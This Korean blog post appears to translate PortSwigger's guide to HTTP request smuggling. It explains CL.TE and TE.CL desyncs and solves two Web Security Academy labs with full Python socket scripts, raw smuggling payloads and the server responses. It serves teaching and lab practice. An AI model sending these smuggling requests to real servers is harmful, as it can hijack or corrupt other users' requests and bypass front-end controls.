---
layout: post
title:  "HTTP Request Smuggling Attack "
date:   2020-11-07
categories: ["2020","web hacking"]
update: 2020-11-07
tags: [web]
---

시험기간 + 다른 할일이 겹쳐 오래 글을 못 썼는데, 이번에 동아리+학부 차원에서 CTF를 열었다가 친구 문제에서 배울 게 있어서 정리도 할겸 한번 써보겠습니다. 친구 문제의 시나리오는 다음과 같습니다.

- HTTP Smuggling + Django SSTI

or

- python urlparse의 취약점을 이용한 CSRF + Django SSTI

CSRF 는 다른 문제에서도 많이 공부할 수 있어서 간단히 링크만 남겨드리고, HTTP Smuggling attack이 뭔지, 예제를 풀어보면서 공부해보겠습니다.

> 🚀 [https://bugs.python.org/issue35748](https://bugs.python.org/issue35748)

이 글은 portswigger의 글을 번역한 내용입니다.

> 🚀 [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)

## HTTP request smuggling

### 🤔 What is HTTP request smuggling? 

HTTP request smuggling 공격은 웹사이트에서 여러 유저들로부터 받은 요청을 처리하는 과정을 간섭해서, 공격자가 민감한 정보에 접근할 수 있게 하거나, 다른 사용자를 공격할 수 있게 하는 공격 방법입니다.

#### 🔍 What happens in an HTTP request smuggling attack?

최근 웹 어플리케이션들은 Back-end와 사용자 사이에 여러 HTTP 서버들을 두고 있습니다. 사용자가 Front-end 서버(로드 밸런서, 리버스 프록시로 불리기도 합니다.)에 요청을 보내면 그 서버가 요청을 Back-end로 포워드해주는 방식입니다. 

Front-end 서버가 HTTP 요청을 Back-end 서버로 포워드해줄 때,  성능을 위해 TCP, SSL/TLS 소켓하나로 여러개의 HTTP 요청을 전달합니다. 방법은 단순합니다 :

- HTTP 요청을 여러 개 보내면, 요청을 받는 서버는 HTTP 요청 헤더를 파싱해서 한 요청이 끝나는 부분과 다음 요청이 시작하는 부분을 결정합니다.

이런 상황에서는, Front-end와 Back-end가 요청의 범위를 정하는 방식이 같아야 합니다. 그렇지 않으면, 공격자가 Front-end와 Back-end가 요청을 해석하는 방식의 차이를 이용해서 공격을 수행할 수도 있습니다.

![](https://portswigger.net/web-security/images/smuggling-http-request-to-back-end-server.svg)

위 사진에서 공격자가 Back-end가 Front-end의 요청 중 일부를 다음 요청의 시작으로 인식하게 만들고, 이는 다음 요청의 시작 부분에 붙어서 해석되기 때문에 어플리케이션이 원치 않는 동작을 할 수 있습니다.

#### 👀 How do HTTP request smugglin vulnerabilities arise?

 대부분 HTTP request smuggling 취약점은 [HTTP 명세](https://tools.ietf.org/html/rfc2616#section-4.4)에서 확인해보면, 요청의 끝을 정하는 방식이 두 가지가 있기 때문에 발생합니다: 하나는 `Content-Length` 헤더를 보고, 하나는 `Transfer-Encoding` 헤더를 보고 결정하는 방식입니다.

`Content-Length` 헤더는 말 그대로 body의 byte 길이를 정의합니다 : 

```http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling # 길이 11
```

`Transfer-Encoding` 헤더는 body가 chunked encoding을 사용하고 있는지 확인하는 헤더입니다. 이 말은 body가 하나 이상의 data chunk를 가지고 있다는 말입니다. 각 chunk는 `16진수로 표현된 chunk size+\r\n+chunk content`로 구성됩니다. 메세지는 zero 사이즈의 chunk로 끝이 납니다 :

```http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b # 11
q=smuggling # 길이 11
0

```

 두 가지 방법으로 body의 길이를 정할 수 있기 때문에, 한 요청이 두 방법 모두를 사용하게 할 수 있습니다.  위에서 언급한 HTTP 명세에서는 만약 두 헤더가 둘 다 있으면, `Content-Length`가 무시되어야 한다고 하고 있습니다. 만약 한 서버만 사용하고 있으면 이 것만으로도 충분히 문제를 해결할 수 있지만, 여러 서버를 사용하고 있으면 이 방법만으로는 충분하지 않습니다 :

- 어떤 서버는 `Transfer-Encoding` 헤더를 지원하지 않습니다.
- `Transfer-Encoding`을 지원하는 서버도, 헤더가 조작되면 그 헤더를 처리하지 않을 수 있습니다.

Front-end 서버와 Back-end 서버가 `Transfer-Encoding` 헤더를 만났을 때 다르게 동작하면, 요청의 범위에 대해서도 다르게 정의할 수 있습니다. 이런 불일치가 **HTTP request smuggling** 공격으로 이어질 수 있습니다.

### 😃 How to perform an HTTP request smuggling attack 

HTTP request smuggling 공격은 `Content-Length`와 `Transfer-Encoding` 헤더를 둘 다 요청에 포함시켜서, Front-end와 Back-end가 요청을 다르게 해석하게 합니다. 공격이 성공하려면 두 서버가 헤더에 대해 어떻게 동작하는 지에 따라 다릅니다 :

`CL` : Content-Length, `TE` : Transfer-Encoding

- `CL.TE` : Front-end 서버는 `Content-Length`를 사용하고, Back-end 서버는 `Trasnfer-Encoding`을 사용하는 경우
- `TE.CL` : 위와 반대
- `TE.TE` : Front-end 서버와 Back-end 서버가 둘다 `Transfer-Encoding` 헤더를 지원하지만, 한 서버는 헤더를 조작해서 헤더를 처리하지 않게 할 수 있는 경우

#### CL.TE vulnerabilities

Front-end 서버는 `Content-Length`를 사용하고 Back-end 서버는 `Transfer-Encoding`를 사용하는 경우입니다. HTTP request smuggling 공격에 쓰이는 페이로드는 다음과 같습니다 :

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED # 0\r\n+\r\n+SMUGGLED = 13
```

Front-end 서버는 `Content-Length` 헤더를 보고 요청 body의 byte 길이가 13이라고 결정합니다. 그리고 이 요청을 Back-end 서버에게 포워드합니다.

Back-end 서버는 `Transfer-Encoding`헤더를 보고 body를 chunked encoding을 사용한 것으로 이해합니다. 그리고 zero size의 chunk를 처리하고, 이 chunk가 요청의 마지막이라고 인식합니다. 그래서 뒤에 `SMUGGLED`는 처리되지 않은 채로 남아있고, Back-end 서버가 이 문자열을 다음 요청의 시작으로 사용합니다.

예제를 하나 풀어보겠습니다 :

**LAB: HTTP request smuggling, basic CL.TE vulnerability**  

**LAB Description :**

이 Lab은 chunked encoding을 지원하지 않는 Front-end 서버와, 지원하는 Back-end 서버로 이루어져 있습니다. Front-end 서버는 `GET`, `POST` 메소드 외에 다른 메소드를 이용한 요청은 거부합니다.

이 Lab을 풀려면, HTTP request smuggling 공격을 이용해서 다음 요청이 `GPOST` 메소드를 사용하게 해야 합니다.

**PAYLOAD : **

```python
import socket
import requests
import ssl

HOST = "ac431f3f1ec6d7438018a64c00cb008d.web-security-academy.net"
PORT = 443

def send_payload(data):
    context=ssl.create_default_context()
    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    ssl_sock=context.wrap_socket(sock,server_hostname=HOST)
    ssl_sock.connect((HOST,PORT))
    ssl_sock.send(data)
    data = ssl_sock.recv(1024)
    ssl_sock.close()

    return data

second_request  = b''

first_request  = b'POST / HTTP/1.1\r\n'
first_request += b'Host: ac431f3f1ec6d7438018a64c00cb008d.web-security-academy.net\r\n'
first_request += b'Content-Length: '+str(len(second_request)+6).encode()+b'\r\n'
first_request += b'Connection: keep-alive\r\n'
first_request += b'Content-Type: application/x-www-form-urlencoded\r\n'
first_request += b'Transfer-Encoding: chunked\r\n'
first_request += b'\r\n'
first_request += b'0\r\n\r\n'
first_request += b'G'


smuggle_request = first_request + second_request

data = send_payload(smuggle_request)

print (f'{"[*] REQUEST":^10}')
print (smuggle_request.decode())
print ("{:^10}".format("[*] RESPONSE"))
print (data.decode())
```

위 페이로드를 두 번 보내면 두 번째 요청에는 백엔드에서 처리하지 않은 `G`가 붙어서 `GPOST / HTTP/1.1`로 요청하게 됩니다.

과정을 조금 자세히 보면 다음과 같습니다 : 

- Front-end 서버에서 `Content-Length`를 보고 요청을 처리하기 때문에, `G` 까지 포함해서 Back-end에 전달합니다.
- Back-end 서버에서는 `Transfer-Encoding`을 보고 처리하기 때문에, `0\r\n\r\n`, 즉 zero size의 청크를 보고 요청의 끝으로 인식합니다.
- 처리되지 않은 `G`는 Back-end에서 대기하다가 다음 요청이 들어오면 그 요청 앞에 붙어서 처리됩니다. 

 **Response : **

```http
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
Connection: close
Keep-Alive: timeout=0
Content-Length: 27

"Unrecognized method GPOST"
```

#### TE.CL vulnerabilities

이번에는 Front-end 서버가 `Transfer-Encoding` 헤더를 사용하고, Back-end 서버는 `Content-Length`를 사용하는 경우입니다. 페이로드는 다음과 같습니다 : 

``` http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

 **NOTE: ** 위 예제에서도 그렇지만, `chunk size 0 +\r\n+chunk(nothing)\r\n`이기 때문에  0 뒤에는 항상 `\r\n\r\n`이 붙어야 합니다.

Front-end 서버는 `Transfer-Encoding` 헤더를 처리하기 때문에 body를 chunked encoding으로 인식합니다. 그래서 첫번째 chunk(`8 + \r\n + SMUGGLED + \r\n`)을 처리합니다. 그리고 zero size의 chunk를 보고 요청의 끝임을 확인합니다. 

Back-end 서버에서는 `Content-Length`를 보고 처리하기 때문에 `8 +\r\n` 까지만 처리하고, 나머지 부분은 처리되지 않은 상태로 남아있게 됩니다. 그리고 남은 부분은, 다음 요청이 들어왔을 때 그 요청 앞에 붙어서 처리됩니다.

이 것도 예제를 풀어보겠습니다 :

**LAB : HTTP request smuggling, basic TE.CL vulnerability**

**LAB Description : **

이 문제는 Front-end와 Back-end 서버로 이루어져 있고 Back-end 서버는 chunked encoding을 지원하지 않습니다. Front-end 서버는 `GET`, `POST` 메소드 외에 다른 메소드를 이용한 요청은 거부합니다.

이 Lab을 풀려면, HTTP request smuggling 공격을 이용해서 다음 요청이 `GPOST` 메소드를 사용하게 해야 합니다.

**PAYLOAD :**

``` python
import socket
import requests
import ssl

HOST = "ac051ff81f715a8e8012640a002d00f9.web-security-academy.net"
PORT = 443

def send_payload(data):
    context=ssl.create_default_context()
    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    ssl_sock=context.wrap_socket(sock,server_hostname=HOST)
    ssl_sock.connect((HOST,PORT))
    ssl_sock.send(data)
    data = ssl_sock.recv(1024)
    ssl_sock.close()

    return data

second_request  = b'GPOST / HTTP/1.1\r\n'
second_request += b'Content-Type: application/x-www-form-urlencoded\r\n'
second_request += b'Content-Length: 10\r\n'
second_request += b'\r\n'
second_request += b'x=1'

first_request  = b'POST / HTTP/1.1\r\n'
first_request += b'Host: '+HOST.encode()+b'\r\n'
first_request += b'Content-Length: 4\r\n'
first_request += b'Connection: keep-alive\r\n'
first_request += b'Content-Type: application/x-www-form-urlencoded\r\n'
first_request += b'Transfer-Encoding: chunked\r\n'
first_request += b'\r\n'
first_request += hex(len(second_request))[2:].encode()+b'\r\n'
first_request += second_request
first_request += b'\r\n'
first_request += b'0\r\n\r\n'


smuggle_request = first_request

data = send_payload(smuggle_request)

print (f'{"[*] REQUEST":^10}')
print (smuggle_request.decode())
print ("{:^10}".format("[*] RESPONSE"))
print (data.decode())
```

Front-end 서버에서 `Transfer-Encoding`을 확인하고 Back-end에서 `Content-Length`를 확인하기 때문에, `0\r\n\r\n`까지 보내놓고, `Content-Length`로 원하는 부분까지 잘라서 사용하면 됩니다. 

`GPOST`로 요청을 보내야하기 때문에 `GPOST` 메소드를 사용하는 요청 하나를 chunk로 만들어 놓고, Back-end에서 처리할 때 그 전까지만 사용하면, `GPOST / HTTP/1.1` 이후는 사용되지 않고 남아있기 때문에 다음 요청의 앞부분에 붙게 됩니다.

**Response :**

``` http
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
Connection: close
Keep-Alive: timeout=0
Content-Length: 27

"Unrecognized method GPOST"
```





#### TODO: TE.TE behavior: obfuscating the TE header